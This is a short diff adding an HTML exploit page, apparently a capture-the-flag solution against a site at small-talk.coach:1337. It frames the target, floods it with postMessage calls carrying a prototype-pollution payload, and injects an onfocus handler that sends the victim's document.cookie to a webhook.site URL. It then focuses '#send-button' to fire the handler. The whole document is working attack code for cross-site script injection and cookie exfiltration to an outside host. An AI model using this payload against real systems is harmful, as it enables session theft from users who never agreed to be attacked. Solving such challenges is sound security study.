@@ -1,0 +1,20 @@
+<iframe src="https://small-talk.coach:1337/" id="ifr"></iframe>
+<script>
+	const it = setInterval(() => {
+		ifr.contentWindow.postMessage(
+			JSON.stringify({
+				'__proto__.reference': {
+					onfocus: 'fetch("https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449?c="+encodeURIComponent(document.cookie))'
+				},
+				'__proto__.bsd': 'bsd'
+			}),
+			'*'
+		)
+	}, 1)
+	ifr.onload = () => {
+		ifr.onload = null
+		clearInterval(it)
+		ifr.src = ifr.src + '#send-button'
+	}
+</script>
+<img src="https://deelay.me/100000/https://google.com">
